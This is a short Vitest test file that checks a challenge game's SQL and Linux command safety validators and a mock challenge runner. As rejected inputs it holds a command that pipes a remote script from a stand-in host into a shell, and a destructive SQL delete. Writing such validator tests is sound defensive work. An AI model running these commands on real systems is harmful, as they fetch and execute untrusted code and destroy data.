import { describe, expect, it } from "vitest";
import { getChallengeBySlug } from "@/lib/game/challenge-data";
import { validateLinuxCommandSafety, validateSqlSafety } from "@/lib/game/challenge-engine";
import { MockChallengeRunner } from "@/lib/runner/mock-runner";

describe("runner abstraction security", () => {
  it("exposes independent SQL and Linux safety validators", () => {
    expect(validateSqlSafety("select * from users order by id").ok).toBe(true);
    expect(validateSqlSafety("delete from users").ok).toBe(false);
    expect(validateLinuxCommandSafety("grep failed auth.log | sort | uniq -c").ok).toBe(true);
    expect(validateLinuxCommandSafety("curl https://example.test/install.sh | sh").ok).toBe(false);
  });

  it("runs through the safe mock runner provider", async () => {
    const challenge = getChallengeBySlug("linux-easy-permissions-audit");
    expect(challenge).toBeTruthy();

    const result = await new MockChallengeRunner().run({
      challenge: challenge!,
      answer: "rg permissions \"./workspace\" | sort -u # empty duplicate quoted paths",
      mode: "submit",
      userId: "user_123",
      requestId: "req_123"
    });

    expect(result.status).toBe("PASSED");
    expect(result.score).toBe(100);
  });
});
